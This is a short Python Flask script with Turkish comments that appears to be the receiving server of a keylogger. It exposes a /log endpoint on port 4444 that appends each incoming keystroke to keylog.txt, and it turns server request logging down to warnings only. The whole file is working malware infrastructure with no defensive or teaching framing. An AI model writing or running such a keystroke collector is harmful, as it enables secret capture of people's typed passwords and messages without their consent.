from flask import Flask, request
import os
import logging

app = Flask(__name__)

# Dosya yolunu belirleyin
LOG_FILE_PATH = 'keylog.txt'

# Flask log seviyesini WARNING olarak ayarlıyoruz
app.logger.setLevel(logging.WARNING)

# Werkzeug log seviyesini de WARNING olarak ayarlıyoruz
log = logging.getLogger('werkzeug')
log.setLevel(logging.WARNING)

@app.route('/log', methods=['POST'])
def handle_keypress():
    data = request.json
    key = data.get('key', '')
    
    # Dosyaya yazma işlemi
    with open(LOG_FILE_PATH, 'a') as f:
        f.write(f"{key}\n")
    
    # Konsola sadece basılan tuşu yazdırıyoruz
    print(f"Alınan tuş: {key}")
    
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=4444)
